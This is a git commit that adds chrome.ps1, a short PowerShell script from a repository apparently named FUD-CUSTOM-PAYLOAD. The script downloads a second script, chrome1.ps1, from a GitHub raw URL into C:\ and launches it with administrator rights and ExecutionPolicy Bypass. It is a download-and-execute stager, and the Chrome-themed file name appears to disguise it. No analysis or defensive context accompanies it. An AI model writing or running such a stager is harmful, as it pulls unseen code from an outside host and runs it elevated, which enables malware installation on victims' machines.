f2eb866f831793ef9ae2acc7dbd344ef623917dd
AKASH <87299311+gamkers@users.noreply.github.com>
2024-03-31 01:09:32 +0530

    Create chrome.ps1

---
+++ chrome.ps1
@@ -0,0 +1,12 @@
+# Define the URL of the script
+$scriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/chrome1.ps1"
+
+# Define the directory where you want to download the script
+$scriptDir = "C:\"
+$scriptPath = Join-Path -Path $scriptDir -ChildPath "chrome.ps1"
+
+# Download the script from GitHub
+Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+
+# Execute the script with administrative privileges
+Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
